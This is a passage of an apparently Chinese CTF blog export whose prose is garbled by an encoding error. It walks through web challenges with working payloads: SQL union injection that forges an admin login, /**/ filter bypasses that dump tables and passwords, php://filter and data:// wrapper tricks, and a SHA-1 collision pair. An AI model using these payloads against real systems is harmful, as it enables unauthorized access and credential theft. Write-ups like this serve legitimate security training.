<span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">"/\(|\)|\=|or/"</span>, $name))&#123;  <span class="hljs-comment">//  è¿‡æ»¤äº†() | = or </span>
	<span class="hljs-keyword">die</span>(<span class="hljs-string">"do not hack me!"</span>);
&#125;
<span class="hljs-keyword">else</span>&#123;
	<span class="hljs-keyword">if</span> (!$result) &#123;
		printf(<span class="hljs-string">"Error: %s\n"</span>, mysqli_error($con));
		<span class="hljs-keyword">exit</span>();
	&#125;
	<span class="hljs-keyword">else</span>&#123;
		<span class="hljs-comment">// echo '&lt;pre&gt;';</span>
		$arr = mysqli_fetch_row($result);
		<span class="hljs-comment">// print_r($arr);</span>
		<span class="hljs-keyword">if</span>($arr[<span class="hljs-number">1</span>] == <span class="hljs-string">"admin"</span>)&#123;
			<span class="hljs-keyword">if</span>(md5($password) == $arr[<span class="hljs-number">2</span>])&#123;    <span class="hljs-comment">//</span>
				<span class="hljs-keyword">echo</span> $flag;
			&#125;
			<span class="hljs-keyword">else</span>&#123;
				<span class="hljs-keyword">die</span>(<span class="hljs-string">"wrong pass!"</span>);
			&#125;
		&#125;
		<span class="hljs-keyword">else</span>&#123;
			<span class="hljs-keyword">die</span>(<span class="hljs-string">"wrong user!"</span>);
		&#125;
	&#125;
&#125;</code></pre></div>

<p>éšä¾¿è¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼ŒæŸ¥çœ‹æºç ï¼Œå‡ºç°æç¤º</p>
<p><img src="/2020/10/05/buuoj/sqli1.png" srcset="/img/loading.gif" alt></p>
<p>è¯•äº†è¯•åº”è¯¥æ˜¯base32ï¼Œè§£ç åæ˜¯base64</p>
<div class="hljs"><pre><code class="hljs gcode">c<span class="hljs-number">2</span><span class="hljs-attr">VsZWN0</span>ICogZ<span class="hljs-symbol">nJvbSB1</span>c<span class="hljs-number">2</span>VyIHdoZXJlIHVzZXJuYW<span class="hljs-number">1</span>lID<span class="hljs-number">0</span>gJyRuYW<span class="hljs-number">1</span>lJw==</code></pre></div>

<p>ç»§ç»­è§£ç </p>
<div class="hljs"><pre><code class="hljs routeros">select * <span class="hljs-keyword">from</span><span class="hljs-built_in"> user </span>where username = <span class="hljs-string">'$name'</span></code></pre></div>

<p>æ³¨å…¥ç‚¹æ˜¯nameå‚æ•°è¿™é‡Œï¼Œä¸ä¸Šé¢æºç ä¸­çš„æŸ¥è¯¢è¯­å¥ä¸€æ ·ã€‚</p>
<p>ç»è¿‡æµ‹è¯•å‘ç°æœ‰ä¸‰åˆ—ï¼Œ<code>name=admin&#39; union select 1,2,3 #&amp;pw=as#</code>æ˜¾ç¤ºæ­£å¸¸ï¼Œ<code>name=admn&#39; union select 1,2,3,4#&amp;pw=as</code>æŠ¥é”™</p>
<p>ä½†æ˜¯é¡µé¢æ²¡æœ‰æ•°å­—å›æ˜¾ï¼Œæ‰€ä»¥å¸¸è§„çš„æ³¨å…¥åº”è¯¥æ˜¯ä¸è¡Œçš„ã€‚</p>
<p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™é¢˜å¯ä»¥çŸ¥é“usernameæ˜¯adminï¼Œ</p>
<p>è¾“å…¥username=admin&amp;password=11,æ—¶æç¤ºwrong pass!</p>
<p>è¾“å…¥username=admn&amp;password=11,æ—¶æç¤ºwrong user!ï¼Œæ‰€ä»¥å¯ä»¥åˆ¤æ–­ç”¨æˆ·åä¸ºadmin</p>
<p>æ¥ä¸‹æ¥ä»‹ç»ä¸€ç§æ–°çš„unionæ³¨å…¥</p>
<p>å…ˆå»ºç«‹ä¸€å¼ è¡¨</p>
<p><img src="/2020/10/05/buuoj/sqli3.png" srcset="/img/loading.gif" alt></p>
<div class="hljs"><pre><code class="hljs crystal"><span class="hljs-keyword">select</span> * from test where id=<span class="hljs-number">0</span> <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,'<span class="hljs-title">admin</span>','2322';</span></code></pre></div>

<p>unionè¯­å¥åæŸ¥è¯¢çš„æ˜¯è¡¨ä¸­ä¸å­˜åœ¨çš„ä¸€ä¸ªæ•°æ®ï¼ŒæŸ¥è¯¢ç»“æœå¦‚ä¸‹</p>
<p><img src="/2020/10/05/buuoj/sqli2.png" srcset="/img/loading.gif" alt></p>
<p><strong>è¿™ä¸ªç»“æœè¯´æ˜ï¼ŒunionæŸ¥è¯¢ä¸€ä¸ªä¸å­˜åœ¨çš„æ•°æ®æ—¶ï¼Œä¼šå»ºç«‹ä¸€ä¸ªè™šæ‹Ÿè¡¨</strong>ï¼Œå…¶ä¸­æ”¾ç€æ‰€æŸ¥è¯¢åˆ°çš„æ•°æ®å’ŒunionååŒ…å«çš„æ•°æ®</p>
<p>è¿™é‡Œå°±æ˜¯ id=1,username=admin,password=2322</p>
<p>è¿™æ ·å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ”¹å˜æ•°æ®åº“ä¸­ç”¨æˆ·çš„å¯†ç ï¼Œç„¶åç”¨è‡ªå·±è®¾ç½®çš„å¯†ç ç™»å½•</p>
<p>æ¥ä¸‹æ¥ï¼Œåˆ©ç”¨è¿™ç‚¹åšè¿™ä¸ªé¢˜ç›®ï¼Œé¦–å…ˆçŸ¥é“ä¸€å…±ä¸‰åˆ—ï¼Œç¬¬ä¸€åˆ—åº”è¯¥æ˜¯idï¼ŒçŸ¥é“ä¹‹åä¸¤åˆ—çš„å†…å®¹å°±å¯ä»¥äº†</p>
<p><code>name=adm&#39; union select 1,&#39;a&#39;,&#39;s&#39; #&amp;pw=11</code>æç¤ºçš„wrong user!</p>
<p><code>name=adm&#39; union select 1,&#39;admin&#39;,&#39;s&#39; #&amp;pw=11</code>æç¤ºçš„wrong pass!</p>
<p>ç¬¬äºŒåˆ—çš„å­—æ®µååº”è¯¥å°±æ˜¯usernameï¼Œç¬¬ä¸‰åˆ—è‡ªç„¶å°±æ˜¯passwordï¼Œä½†æ˜¯è¿™é¢˜çš„passwordå­—æ®µå­˜æ”¾çš„æ—¶md5åŠ å¯†åçš„å†…å®¹<strong>ï¼ˆçœ‹åˆ°å¸ˆå‚…ä»¬çš„wpæ‰çŸ¥é“çš„ï¼Œçœ‹åˆ°æºç ä¹Ÿç¡®å®è¿™æ ·ï¼Œä½†æ˜¯åœ¨æ¯”èµ›çš„æ—¶å€™è¿™ä¹ˆå‘ç°ä¸å¾—è€ŒçŸ¥ï¼‰</strong></p>
<p>payload:</p>
<div class="hljs"><pre><code class="hljs routeros"><span class="hljs-attribute">name</span>=000'union select 1,<span class="hljs-string">'admin'</span>,<span class="hljs-string">'b59c67bf196a4758191e42f76670ceba'</span>#&amp;<span class="hljs-attribute">pw</span>=1111</code></pre></div>

<p><code>b59c67bf196a4758191e42f76670ceba</code>æ˜¯1111çš„md5å€¼ï¼Œpwçš„å€¼ä¸º1111</p>
<p><img src="/2020/10/05/buuoj/sqli.png" srcset="/img/loading.gif" alt></p>
]]></content>
      <categories>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>äºŒåˆ†æ³¨å…¥</tag>
        <tag>æŠ¥é”™æ³¨å…¥</tag>
        <tag>unionæ–°å§¿åŠ¿</tag>
      </tags>
  </entry>
  <entry>
    <title>cumtctf</title>
    <url>/2020/09/27/cumtctf/</url>
    <content><![CDATA[<h1 id="CUMTCTF-wp"><a href="#CUMTCTF-wp" class="headerlink" title="CUMTCTF-wp"></a>CUMTCTF-wp</h1><a id="more"></a>

<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h3><p>æç¤ºGETä¸€ä¸ª1,é‚£å°± url+?1</p>
<p><img src="/2020/09/27/cumtctf/w1.png" srcset="/img/loading.gif" alt></p>
<p>æç¤ºpostä¸€ä¸ª2</p>
<p>é‚£å°±postä¸€ä¸ª</p>
<p><strong>æ³¨æ„çš„æ˜¯è¦2=ä»»æ„å­—ç¬¦æ‰å‡ºç°æºç </strong></p>
<p> <img src="/2020/09/27/cumtctf/w2.png" srcset="/img/loading.gif" alt></p>
<p>å®¡è®¡ä»£ç ï¼Œè¿™é‡Œåº”è¯¥æ˜¯åˆ©ç”¨file_get_contents()çš„æ¼æ´ç›´æ¥è¯»ç½‘é¡µæºç ï¼Œå¹¶ä¸”æç¤ºflagåœ¨flag.php,ç›´æ¥<code>php://filter/read=convert.base64-encode/resource=flag.php</code>ï¼Œè¯»å–base64æºç ä¹‹åè§£ç å³å¯</p>
<p><img src="/2020/09/27/cumtctf/w4.png" srcset="/img/loading.gif" alt></p>
<p>PD9waHANCgkkZmxhZz0iQ1VNVENURnsxNzkwNTViNC1lOGY1LTQyZDItYmZlNC0wMjdkMTVlOTQ2YjJ9Ijs=</p>
<h3 id="babysql"><a href="#babysql" class="headerlink" title="babysql"></a>babysql</h3><p>é¦–å…ˆåˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥<code>username=admin&amp;password=pw&#39;</code></p>
<p>åœ¨åé¢åŠ ä¸Šå•å¼•å·åå‡ºç°æŠ¥é”™æç¤ºï¼Œç¡®è®¤æœ‰æ³¨å…¥ç‚¹</p>
<p>ä½†æ˜¯ç»§ç»­æµ‹è¯• <code>&#39;or 1=1 #</code>ä¼šå‡ºç°</p>
<p><img src="/2020/09/27/cumtctf/w2-1.png" srcset="/img/loading.gif" alt></p>
<p>åˆ¤æ–­å­˜åœ¨é»‘åå•è¿‡æ»¤ã€‚</p>
<p>æ¥ä¸‹æ¥å°±æ˜¯åˆ¤æ–­æ˜¯å°†ä»€ä¹ˆåŠ å…¥é»‘åå•äº†ï¼Œç»è¿‡å­—å…¸æµ‹è¯•å‘ç°æ˜¯<strong>ç©ºæ ¼</strong>ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨/**/ç»•è¿‡ã€‚</p>
<p>å…ˆæµ‹è¯•æœ‰å¤šå°‘åˆ—ï¼Œ<code>&#39;union/**/select/**/1,2,3,4,5,6,7#</code>  åˆ°ç¬¬ä¸ƒçš„æ—¶å€™ï¼Œé¡µé¢æŠ¥é”™ã€‚</p>
<p>   <code>&#39;union/**/select/**/1,2,3,4,5,6,7,8#</code> åˆ°ç¬¬å…«çš„æ—¶å€™æ˜¾ç¤ºä¸‹å›¾ï¼Œè¯´æ˜ä¸€å…±å…«åˆ—ï¼Œå¹¶ä¸”ç¬¬å››åˆ—å‡ºç°å›æ˜¾ã€‚</p>
<p><img src="/2020/09/27/cumtctf/w2-2.png" srcset="/img/loading.gif" alt></p>
<p><strong>çˆ†è¡¨</strong></p>
<div class="hljs"><pre><code class="hljs sql">username=admin&amp;password=pw'union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-keyword">group_concat</span>(TABLE_NAME),<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.TABLES<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>TABLE_SCHEMA=<span class="hljs-keyword">database</span>()<span class="hljs-comment">#</span></code></pre></div>

<p><strong>çˆ†åˆ—å</strong></p>
<div class="hljs"><pre><code class="hljs sql">username=admin&amp;password=pw'union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-keyword">group_concat</span>(COLUMN_NAME),<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.COLUMNS<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>TABLE_NAME=<span class="hljs-string">'users'</span><span class="hljs-comment">#</span></code></pre></div>

<p><code>user_id,first_name,last_name,user,password,avatar,last_login,failed_login</code>åˆ—åå¾ˆå¤šï¼Œé€‰æ‹©password</p>
<p><strong>çˆ†flag</strong></p>
<div class="hljs"><pre><code class="hljs sql">username=admin&amp;password=pw'union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-keyword">group_concat</span>(<span class="hljs-keyword">password</span>),<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">users</span><span class="hljs-comment">#</span></code></pre></div>

<p><img src="/2020/09/27/cumtctf/w2-3.png" srcset="/img/loading.gif" alt></p>
<h3 id="secret"><a href="#secret" class="headerlink" title="secret"></a>secret</h3><p>æ‰«æä¸€ä¸‹ç›®å½•å‘ç°å­˜åœ¨ä¸€ä¸ª<a href="http://www.zipçš„æ–‡ä»¶ï¼Œç›´æ¥ä¸‹è½½å¾—åˆ°æºç ï¼Œä¸‹é¢å°±æ˜¯ä¸€å±‚ä¸€å±‚çš„ç»•è¿‡" target="_blank" rel="noopener">www.zipçš„æ–‡ä»¶ï¼Œç›´æ¥ä¸‹è½½å¾—åˆ°æºç ï¼Œä¸‹é¢å°±æ˜¯ä¸€å±‚ä¸€å±‚çš„ç»•è¿‡</a></p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
error_reporting(<span class="hljs-number">0</span>);
<span class="hljs-keyword">include_once</span>(<span class="hljs-string">'flag.php'</span>);
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'param1'</span>]))
&#123;
    $str1=$_GET[<span class="hljs-string">'param1'</span>];
    <span class="hljs-keyword">if</span>(file_get_contents($str1)!==<span class="hljs-string">'Suvin_wants_a_girlfriend'</span>)
        <span class="hljs-keyword">die</span>(<span class="hljs-string">"Suvin doesn't like you"</span>);
    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'param2'</span>]))&#123;
        $str2=$_GET[<span class="hljs-string">'param2'</span>];
        <span class="hljs-keyword">if</span>(!is_numeric($str2))
            <span class="hljs-keyword">die</span>(<span class="hljs-string">'Suvin prefers strings of Numbers'</span>);
        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($str2&lt;<span class="hljs-number">3600</span>*<span class="hljs-number">24</span>*<span class="hljs-number">30</span>)
            <span class="hljs-keyword">die</span>(<span class="hljs-string">'Suvin says the num is too short'</span>);
        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($str2&gt;<span class="hljs-number">3600</span>*<span class="hljs-number">24</span>*<span class="hljs-number">31</span>)
            <span class="hljs-keyword">die</span>(<span class="hljs-string">'Suvin says the num is too long'</span>);
        <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-keyword">echo</span> <span class="hljs-string">"Suvin says he's falling in love with you!"</span>.<span class="hljs-string">"&lt;/br&gt;"</span>;
            sleep(intval($str2)); 
        &#125;
        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'param1'</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'param2'</span>])) &#123;
            $str1=$_POST[<span class="hljs-string">'param1'</span>];
            $str2=$_POST[<span class="hljs-string">'param2'</span>];
            <span class="hljs-keyword">if</span>(strlen($str1)&gt;<span class="hljs-number">1000</span>)
                <span class="hljs-keyword">die</span>(<span class="hljs-string">"It's too long"</span>);
            <span class="hljs-keyword">if</span>(((string)$str1!==(string)$str2)&amp;&amp;(sha1($str1)===sha1($str2)))
                <span class="hljs-keyword">echo</span> $flag;
            <span class="hljs-keyword">else</span> 
                <span class="hljs-keyword">die</span>(<span class="hljs-string">"It's so similar to md5"</span>);
        &#125;
    &#125;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>é¦–å…ˆgetæ–¹å¼è·å–ä¸¤ä¸ªå‚æ•°ï¼Œparam1è¦ç­‰äºé‚£ä¸ªå­—ç¬¦ä¸²ï¼Œè¿™é‡Œä½¿ç”¨phpçš„dataä¼ªåè®®</p>
<p>param2è¦åœ¨<code>3600*24*30</code>å’Œ<code>3600*24*31</code>ä¹‹é—´ï¼Œå¯ä»¥å–2.6e6,è¿™ä¸¤ä¸ªå‚æ•°ç»•è¿‡åï¼Œå°±è¦ç»•è¿‡ä¸‹é¢çš„postæ–¹å¼ä¸Šä¼ çš„ä¸¤ä¸ªå€¼</p>
<p>å¯¹parame1çš„é•¿åº¦è¿›è¡Œäº†é™åˆ¶ï¼Œå¹¶ä¸”ä¸¤å‚æ•°çš„å­—ç¬¦ä¸²å½¢å¼ä¸ç›¸ç­‰ï¼Œsha1çš„å€¼è¦ç›¸ç­‰ï¼Œé¦–å…ˆæƒ³åˆ°çš„æ˜¯ä¸md5å‡½æ•°ä¸€æ ·ï¼Œä½¿ç”¨æ•°ç»„ç»•è¿‡ï¼Œä½†æ˜¯è¿™é¢˜æ²¡é‚£ä¹ˆç®€å•ï¼Œè¯•äº†å¾ˆå¤šæ¬¡éƒ½ä¸è¡Œã€‚ç½‘ä¸Šæœäº†ä¸€ä¸‹ï¼Œå‘ç°äº†ä¸€ä¸ªå¾ˆç±»ä¼¼çš„é¢˜ç›®ï¼ˆsha1å¼±ç¢°æ’ï¼‰ï¼Œå…¶ä¸­ä¹Ÿç»™å‡ºç¬¦åˆè¦æ±‚çš„å­—ç¬¦ä¸²ã€‚</p>
<p><a href="https://blog.csdn.net/caiqiiqi/article/details/68953730?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~first_rank_v2~rank_v25-1-68953730.nonecase&utm_term=%E4%B8%8D%E5%90%8C%E5%AD%97%E7%AC%A6%E4%B8%B2sha1%E4%B8%80%E6%A0%B7" target="_blank" rel="noopener">ç‚¹è¿™é‡Œ</a></p>
<p>å®Œæ•´çš„payloadï¼š</p>
<p><code>?param1=data://text/plain;base64,U3V2aW5fd2FudHNfYV9naXJsZnJpZW5k&amp;param2=0.26e7</code></p>
<div class="hljs"><pre><code class="hljs llvm">POST:
param<span class="hljs-number">1</span>=<span class="hljs-symbol">%25</span>PDF<span class="hljs-number">-1.3</span><span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%25</span><span class="hljs-symbol">%E2</span><span class="hljs-symbol">%E3</span><span class="hljs-symbol">%CF</span><span class="hljs-symbol">%D3</span><span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%0</span>A<span class="hljs-number">1</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>obj<span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%3</span>C<span class="hljs-symbol">%3</span>C/Width<span class="hljs-symbol">%202</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Height<span class="hljs-symbol">%203</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Type<span class="hljs-symbol">%204</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Subtype<span class="hljs-symbol">%205</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Filter<span class="hljs-symbol">%206</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/ColorSpace<span class="hljs-symbol">%207</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Length<span class="hljs-symbol">%208</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/BitsPerComponent<span class="hljs-symbol">%208</span><span class="hljs-symbol">%3</span>E<span class="hljs-symbol">%3</span>E<span class="hljs-symbol">%0</span>Astream<span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%FF</span><span class="hljs-symbol">%D8</span><span class="hljs-symbol">%FF</span><span class="hljs-symbol">%FE</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%24</span>SHA<span class="hljs-number">-1</span><span class="hljs-symbol">%20</span>is<span class="hljs-symbol">%20</span>dead<span class="hljs-symbol">%21</span><span class="hljs-symbol">%21</span><span class="hljs-symbol">%21</span><span class="hljs-symbol">%21</span><span class="hljs-symbol">%21</span><span class="hljs-symbol">%85</span>/<span class="hljs-symbol">%EC</span><span class="hljs-symbol">%09</span><span class="hljs-symbol">%239</span>u<span class="hljs-symbol">%9</span>C<span class="hljs-number">9</span><span class="hljs-symbol">%B1</span><span class="hljs-symbol">%A1</span><span class="hljs-symbol">%C6</span><span class="hljs-symbol">%3</span>CL<span class="hljs-symbol">%97</span><span class="hljs-symbol">%E1</span><span class="hljs-symbol">%FF</span><span class="hljs-symbol">%FE</span><span class="hljs-symbol">%01</span><span class="hljs-symbol">%7</span>FF<span class="hljs-symbol">%DC</span><span class="hljs-symbol">%93</span><span class="hljs-symbol">%A6</span><span class="hljs-symbol">%B6</span><span class="hljs-symbol">%7</span>E<span class="hljs-symbol">%01</span><span class="hljs-symbol">%3</span>B<span class="hljs-symbol">%02</span><span class="hljs-symbol">%9</span>A<span class="hljs-symbol">%AA</span><span class="hljs-symbol">%1</span>D<span class="hljs-symbol">%B2V</span><span class="hljs-symbol">%0</span>BE<span class="hljs-symbol">%CAg</span><span class="hljs-symbol">%D6</span><span class="hljs-symbol">%88</span><span class="hljs-symbol">%C7</span><span class="hljs-symbol">%F8K</span><span class="hljs-symbol">%8</span>CLy<span class="hljs-symbol">%1</span>F<span class="hljs-symbol">%E0</span><span class="hljs-symbol">%2</span>B<span class="hljs-symbol">%3</span>D<span class="hljs-symbol">%F6</span><span class="hljs-symbol">%14</span><span class="hljs-symbol">%F8m</span><span class="hljs-symbol">%B1i</span><span class="hljs-symbol">%09</span><span class="hljs-symbol">%01</span><span class="hljs-symbol">%C5kE</span><span class="hljs-symbol">%C1S</span><span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%FE</span><span class="hljs-symbol">%DF</span><span class="hljs-symbol">%B7</span><span class="hljs-symbol">%608</span><span class="hljs-symbol">%E9rr</span>/<span class="hljs-symbol">%E7</span><span class="hljs-symbol">%ADr</span><span class="hljs-symbol">%8</span>F<span class="hljs-symbol">%0</span>EI<span class="hljs-symbol">%04</span><span class="hljs-symbol">%E0F</span><span class="hljs-symbol">%C20W</span><span class="hljs-symbol">%0</span>F<span class="hljs-symbol">%E9</span><span class="hljs-symbol">%D4</span><span class="hljs-symbol">%13</span><span class="hljs-symbol">%98</span><span class="hljs-symbol">%AB</span><span class="hljs-symbol">%E1.</span><span class="hljs-symbol">%F5</span><span class="hljs-symbol">%BC</span><span class="hljs-symbol">%94</span><span class="hljs-symbol">%2</span>B<span class="hljs-symbol">%E35B</span><span class="hljs-symbol">%A4</span><span class="hljs-symbol">%80</span>-<span class="hljs-symbol">%98</span><span class="hljs-symbol">%B5</span><span class="hljs-symbol">%D7</span><span class="hljs-symbol">%0</span>F<span class="hljs-symbol">%2</span>A<span class="hljs-number">3</span>.<span class="hljs-symbol">%C3</span><span class="hljs-symbol">%7</span>F<span class="hljs-symbol">%AC5</span><span class="hljs-symbol">%14</span><span class="hljs-symbol">%E7M</span><span class="hljs-symbol">%DC</span><span class="hljs-symbol">%0</span>F<span class="hljs-symbol">%2</span>C<span class="hljs-symbol">%C1</span><span class="hljs-symbol">%A8t</span><span class="hljs-symbol">%CD</span><span class="hljs-symbol">%0</span>Cx<span class="hljs-number">0</span>Z<span class="hljs-symbol">%21</span>Vda<span class="hljs-number">0</span><span class="hljs-symbol">%97</span><span class="hljs-symbol">%89</span><span class="hljs-symbol">%60</span>k<span class="hljs-symbol">%D0</span><span class="hljs-symbol">%BF</span><span class="hljs-symbol">%3</span>F<span class="hljs-symbol">%98</span><span class="hljs-symbol">%CD</span><span class="hljs-symbol">%A8</span><span class="hljs-symbol">%04</span>F<span class="hljs-symbol">%29</span><span class="hljs-symbol">%A1</span>&amp;param<span class="hljs-number">2</span>=<span class="hljs-symbol">%25</span>PDF<span class="hljs-number">-1.3</span><span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%25</span><span class="hljs-symbol">%E2</span><span class="hljs-symbol">%E3</span><span class="hljs-symbol">%CF</span><span class="hljs-symbol">%D3</span><span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%0</span>A<span class="hljs-number">1</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>obj<span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%3</span>C<span class="hljs-symbol">%3</span>C/Width<span class="hljs-symbol">%202</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Height<span class="hljs-symbol">%203</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Type<span class="hljs-symbol">%204</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Subtype<span class="hljs-symbol">%205</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Filter<span class="hljs-symbol">%206</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/ColorSpace<span class="hljs-symbol">%207</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Length<span class="hljs-symbol">%208</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/BitsPerComponent<span class="hljs-symbol">%208</span><span class="hljs-symbol">%3</span>E<span class="hljs-symbol">%3</span>E<span class="hljs-symbol">%0</span>Astream<span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%FF</span><span class="hljs-symbol">%D8</span><span class="hljs-symbol">%FF</span><span class="hljs-symbol">%FE</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%24</span>SHA<span class="hljs-number">-1</span><span class="hljs-symbol">%20</span>is<span class="hljs-symbol">%20</span>dead<span class="hljs-symbol">%21</span><span class="hljs-symbol">%21</span><span class="hljs-symbol">%21</span><span class="hljs-symbol">%21</span><span class="hljs-symbol">%21</span><span class="hljs-symbol">%85</span>/<span class="hljs-symbol">%EC</span><span class="hljs-symbol">%09</span><span class="hljs-symbol">%239</span>u<span class="hljs-symbol">%9</span>C<span class="hljs-number">9</span><span class="hljs-symbol">%B1</span><span class="hljs-symbol">%A1</span><span class="hljs-symbol">%C6</span><span class="hljs-symbol">%3</span>CL<span class="hljs-symbol">%97</span><span class="hljs-symbol">%E1</span><span class="hljs-symbol">%FF</span><span class="hljs-symbol">%FE</span><span class="hljs-symbol">%01</span>sF<span class="hljs-symbol">%DC</span><span class="hljs-symbol">%91</span>f<span class="hljs-symbol">%B6</span><span class="hljs-symbol">%7</span>E<span class="hljs-symbol">%11</span><span class="hljs-symbol">%8</span>F<span class="hljs-symbol">%02</span><span class="hljs-symbol">%9</span>A<span class="hljs-symbol">%B6</span><span class="hljs-symbol">%21</span><span class="hljs-symbol">%B2V</span><span class="hljs-symbol">%0</span>F<span class="hljs-symbol">%F9</span><span class="hljs-symbol">%CAg</span><span class="hljs-symbol">%CC</span><span class="hljs-symbol">%A8</span><span class="hljs-symbol">%C7</span><span class="hljs-symbol">%F8</span><span class="hljs-symbol">%5</span>B<span class="hljs-symbol">%A8Ly</span><span class="hljs-symbol">%03</span><span class="hljs-symbol">%0</span>C<span class="hljs-symbol">%2</span>B<span class="hljs-symbol">%3</span>D<span class="hljs-symbol">%E2</span><span class="hljs-symbol">%18</span><span class="hljs-symbol">%F8m</span><span class="hljs-symbol">%B3</span><span class="hljs-symbol">%A9</span><span class="hljs-symbol">%09</span><span class="hljs-symbol">%01</span><span class="hljs-symbol">%D5</span><span class="hljs-symbol">%DFE</span><span class="hljs-symbol">%C1O</span><span class="hljs-symbol">%26</span><span class="hljs-symbol">%FE</span><span class="hljs-symbol">%DF</span><span class="hljs-symbol">%B3</span><span class="hljs-symbol">%DC8</span><span class="hljs-symbol">%E9j</span><span class="hljs-symbol">%C2</span>/<span class="hljs-symbol">%E7</span><span class="hljs-symbol">%BDr</span><span class="hljs-symbol">%8</span>F<span class="hljs-symbol">%0</span>EE<span class="hljs-symbol">%BC</span><span class="hljs-symbol">%E0F</span><span class="hljs-symbol">%D2</span><span class="hljs-symbol">%3</span>CW<span class="hljs-symbol">%0</span>F<span class="hljs-symbol">%EB</span><span class="hljs-symbol">%14</span><span class="hljs-symbol">%13</span><span class="hljs-symbol">%98</span><span class="hljs-symbol">%BBU.</span><span class="hljs-symbol">%F5</span><span class="hljs-symbol">%A0</span><span class="hljs-symbol">%A8</span><span class="hljs-symbol">%2</span>B<span class="hljs-symbol">%E31</span><span class="hljs-symbol">%FE</span><span class="hljs-symbol">%A4</span><span class="hljs-symbol">%807</span><span class="hljs-symbol">%B8</span><span class="hljs-symbol">%B5</span><span class="hljs-symbol">%D7</span><span class="hljs-symbol">%1</span>F<span class="hljs-symbol">%0</span>E<span class="hljs-number">3</span>.<span class="hljs-symbol">%DF</span><span class="hljs-symbol">%93</span><span class="hljs-symbol">%AC5</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%EBM</span><span class="hljs-symbol">%DC</span><span class="hljs-symbol">%0</span>D<span class="hljs-symbol">%EC</span><span class="hljs-symbol">%C1</span><span class="hljs-symbol">%A8dy</span><span class="hljs-symbol">%0</span>Cx<span class="hljs-symbol">%2</span>Cv<span class="hljs-symbol">%21</span>V<span class="hljs-symbol">%60</span><span class="hljs-symbol">%DD0</span><span class="hljs-symbol">%97</span><span class="hljs-symbol">%91</span><span class="hljs-symbol">%D0k</span><span class="hljs-symbol">%D0</span><span 